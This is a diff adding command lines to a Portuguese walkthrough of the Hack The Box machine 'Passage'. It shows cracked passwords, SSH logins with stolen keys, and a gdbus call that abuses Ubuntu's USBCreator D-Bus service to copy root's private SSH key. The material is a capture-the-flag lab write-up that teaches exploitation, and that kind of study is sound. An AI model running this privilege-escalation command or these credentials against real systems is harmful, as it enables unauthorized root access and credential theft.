@@ -176,8 +176,7 @@ kim:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
 egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc >> cracked: egre55
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Após algum tempo, tivemos sucesso quebrando 2 senhas.
-
+Usando o site [Crackstation](https://crackstation.net/) tivemos sucesso quebrando 2 senhas.
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 paul:atlanta1
 egre55:egre55
@@ -195,7 +194,9 @@ Após isso podemos encontrar chaves RSA para fazermos a conexão via SSH
 
 Agora podemos nos conectar via ssh :D
 ![Image](https://i.imgur.com/GSIodbP.png)
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ssh paul@passage.htb -i id_rsa_paul
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Após melhorar nossa conexão usando o SSH, analisando melhor a pasta /home/paul/.ssh/ podemor perceber que existe um arquivo de autorização (authorized_keys)...
 dentro dele temos uma chave pública.
@@ -205,20 +206,33 @@ dentro dele temos uma chave pública.
 Então agora logamos como 'nadav'
 
 ![Image](https://i.imgur.com/G7Ko2Uy.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ssh nadav@passage
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Agora logados como 'nadav', começamos a procurar um maneira de escalar privilégios.
 ![Image](https://i.imgur.com/n3aPLv7.png)
 
 Ao analisar os processos rodando como root, pude perceber que existe um processo chamado: 'usb-creator-helper'
 ![Image](https://i.imgur.com/RxRhFul.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ps aux | grep root
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 O [Artigo](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) nos da uma boa pista(até o nome do user \o/)
 
 Com isso, podemos obter a chave RSA do root.
 ![Image](https://i.imgur.com/RsLZba2.png)
+Podemos perceber que o arquivo é criado como root
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/chu/chu.txt true
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Agora basta logarmos usando a chave
 ![Image](https://i.imgur.com/9UCzj7K.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ssh root@passage.htb -i id_rsa_root
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
 if i helped you, add + respect at my profile :D
